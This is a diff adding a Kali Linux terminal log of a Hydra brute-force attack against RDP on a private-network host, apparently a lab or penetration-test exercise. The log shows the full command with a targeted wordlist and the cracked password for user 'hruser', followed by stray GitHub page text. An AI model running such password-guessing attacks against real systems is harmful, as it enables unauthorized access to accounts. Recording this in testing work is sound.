@@ -1,0 +1,15 @@
+┌──(kali㉿kali)-[~/Desktop]
+└─$ hydra -l hruser -P /tmp/targeted-list.txt -t 1 -w 5  rdp://192.168.10.100
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-27 12:45:10
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 1 task per 1 server, overall 1 task, 51 login tries (l:1/p:51), ~51 tries per task
+[DATA] attacking rdp://192.168.10.100:3389/
+[STATUS] 26.00 tries/min, 26 tries in 00:01h, 26 to do in 00:02h, 1 active
+[3389][rdp] host: 192.168.10.100   login: hruser   password: Aa1111!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-27 12:47:03
+GitHub
+GitHub - vanhauser-thc/thc-hydra: hydra
+hydra. Contribute to vanhauser-thc/thc-hydra development by creating an account on GitHub.
+
